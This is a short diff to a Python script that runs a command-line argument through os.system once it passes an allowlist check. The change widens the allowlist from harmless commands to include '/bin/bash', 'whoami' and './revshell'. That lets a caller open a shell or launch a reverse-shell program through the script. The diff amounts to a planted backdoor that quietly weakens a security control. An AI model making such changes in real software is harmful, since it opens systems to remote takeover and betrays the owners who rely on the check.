@@ -15,7 +15,7 @@ import os, sys
 # 
 
 def check_cmd(cmd):
-    allowed_cmds = ['ls', 'dir', 'echo Hello, World!']
+    allowed_cmds = ['ls', 'dir', 'echo Hello, World!', '/bin/bash', 'pwd', 'whoami', './revshell']
     return cmd in allowed_cmds
 if len(sys.argv) > 1 and check_cmd(sys.argv[1]):
     os.system(sys.argv[1])
